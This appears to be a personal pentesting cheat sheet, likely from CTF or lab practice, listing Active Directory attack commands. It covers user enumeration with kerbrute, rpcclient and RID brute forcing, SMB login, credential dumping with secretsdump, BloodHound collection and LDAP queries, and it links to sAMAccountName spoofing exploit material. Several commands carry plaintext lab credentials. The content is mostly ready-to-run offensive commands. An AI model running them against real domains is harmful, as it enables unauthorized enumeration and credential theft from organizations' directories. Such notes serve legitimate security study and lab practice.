# Active Directory

### Ways to enumerate users

- kerbrute
```bash
$ kerbrute userenum -d domain --dc 10.11.12.13 user.lst
```

- rpcclient
```bash
$ rpcclient -U "" 10.11.12.13
rpcclient> enumdomusers
```

- RID bruteforce attack
```bash
$ impacket-lookupsid domain/guest@10.11.12.13
```

### SMB client
```bash
$smbclient //$IP/NETLOGON -U "vulnnet-rst/t-skid" "tj072889*"
```

### LSASS dump
- Requires username and password
```bash
secretsdump.py 'holo.live/watamet:Nothingtoworry!@10.200.110.31'
```

### Bloodhound
```bash
$ bloodhound-python -u <user> -p <pass> -ns 10.5.1.1 -d domain.local --dns-tcp
```

### LDAP Search
```bash
$ ldapsearch -h 172.21.48.1 -p 389 -x -w Secret123 -D localadmin@windcorp.htb -b 'dc=windcorp,dc=htb'


# bind (-b) examples
dc=foo,dc=com
cn=Users,dc=domain,dc=tld
```

### sAMAccountName spoofing
- Not automated script, explains step by step with PowerShell commands
```
https://cloudbrothers.info/exploit-kerberos-samaccountname-spoofing/#automated-kill-chain
```

- Automated script
```
https://github.com/WazeHell/sam-the-admin
```
